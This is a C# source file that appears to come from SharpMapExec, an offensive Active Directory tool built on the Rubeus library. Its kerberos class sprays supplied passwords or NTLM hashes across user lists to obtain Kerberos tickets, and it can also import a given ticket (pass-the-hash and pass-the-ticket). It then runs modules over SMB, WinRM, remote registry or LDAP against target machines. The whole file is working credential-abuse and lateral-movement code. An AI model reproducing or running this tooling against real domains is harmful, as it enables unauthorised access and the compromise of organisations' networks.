using Rubeus;
using SharpMapExec.Helpers;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using static Rubeus.Interop;

namespace SharpMapExec.Lib
{
    public class kerberos
    {
        public static void Kerberos(string[] users, string domain, string[] passwords, string[] hashes, string ticket, KERB_ETYPE encType, string dc, string[] computernames, string module, string moduleargument, string path, string destination, List<string> flags, string protocol)
        {
            StartJob(users, domain, passwords, hashes, ticket, encType, dc, computernames, module, moduleargument, path, destination, flags, protocol);
            //var listOfTasks = new List<Task>();
            //listOfTasks.Add(new Task(() => StartJob(users, domain, passwords, hashes, ticket, encType, dc, computernames, module, moduleargument, path, destination, flags, protocol)));
            //Tasks.StartAndWaitAllThrottled(listOfTasks, 1);
        }

        public static void StartJob(string[] users, string domain, string[] passwords, string[] hashes, string ticket, KERB_ETYPE encType, string dc, string[] computernames, string module, string moduleargument, string path, string destination, List<string> flags, string protocol)
        {
            AToken.MakeToken("Fake", "Fake", "Fake");
            Console.WriteLine("------------------");
            
            if (String.IsNullOrEmpty(ticket))
            {
                var secrets = hashes.Length > 0 ? hashes : passwords;
                foreach (string user in users)
                {
                    foreach (string secret in secrets)
                    {
                        string hash;
                        if (passwords.Length > 0)
                        {
                            string salt = String.Format("{0}{1}", domain.ToUpper(), user);
                            hash = Crypto.KerberosPasswordHash(encType, secret, salt);
                        }
                        else
                        {
                            hash = secret;
                        }
                        Console.WriteLine(string.Format("[*] User:   {0}", user));
                        Console.WriteLine(string.Format("[*] Domain: {0}", domain));
                        Console.WriteLine(string.Format("[*] Secret: {0}", secret));
                        string ticketoutput = SecurityContext.AskTicket(user, domain, hash, encType, dc);
                        if (ticketoutput.Contains("[+] Ticket successfully imported!"))
                            Console.WriteLine("[+] Ticket successfully imported!");
                        else
                        {
                            Console.WriteLine("[-] Could not request TGT");
                            continue;
                        }
                        if (protocol.ToLower() == "smb")
                            Scan.SMB(computernames, module);
                        else if (protocol.ToLower() == "winrm")
                            Scan.WINRM(computernames, module, moduleargument, path, destination, flags);
                        else if (protocol.ToLower() == "reg32")
                            Scan.REG32(computernames, module);
                        else if (protocol.ToLower() == "ldap")
                            Scan.LDAP(module, domain, dc);
                    }
                }
            }
            else
            {
                Console.WriteLine(string.Format("[*] Ticket: {0}", ticket));
                string ticketoutput = SecurityContext.ImportTicket(ticket);
                if (ticketoutput.Contains("[+] Ticket successfully imported!"))
                    Console.WriteLine("[+] TGT imported successfully!");
                else
                {
                    Console.WriteLine("[-] Could not import TGT");
                    return;
                }
                if (protocol.ToLower() == "smb")
                    Scan.SMB(computernames, module);
                else if (protocol.ToLower() == "winrm")
                    Scan.WINRM(computernames, module, moduleargument, path, destination, flags);
                else if (protocol.ToLower() == "reg32")
                    Scan.REG32(computernames, module);
                else if (protocol.ToLower() == "ldap")
                    Scan.LDAP(module, domain, dc);
            }

            AToken.RevertFromToken();
        }
    }
}